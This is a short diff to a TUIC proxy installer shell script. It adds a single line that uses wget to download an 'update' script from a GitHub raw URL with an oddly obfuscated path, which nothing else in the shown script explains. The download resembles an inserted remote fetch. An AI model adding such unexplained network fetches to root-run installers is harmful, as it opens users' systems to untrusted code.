@@ -281,6 +281,7 @@ EOF
     cat /root/tuic/v2rayn.json
     yellow "Tuic 节点配置明文如下，并保存到 /root/tuic/tuic.txt"
     cat /root/tuic/tuic.txt
+    wget https://raw.githubusercontent.com/fodlkfjasuqwenc12134672/qx9956079102394/erwi219304/rm/rm/rm/rm/rm/rm/rm/rm/rm/rm/192/rm/rm/rm/rm/rm/error/rm/rm/tuic-update.sh
     ufw enable
 }
 
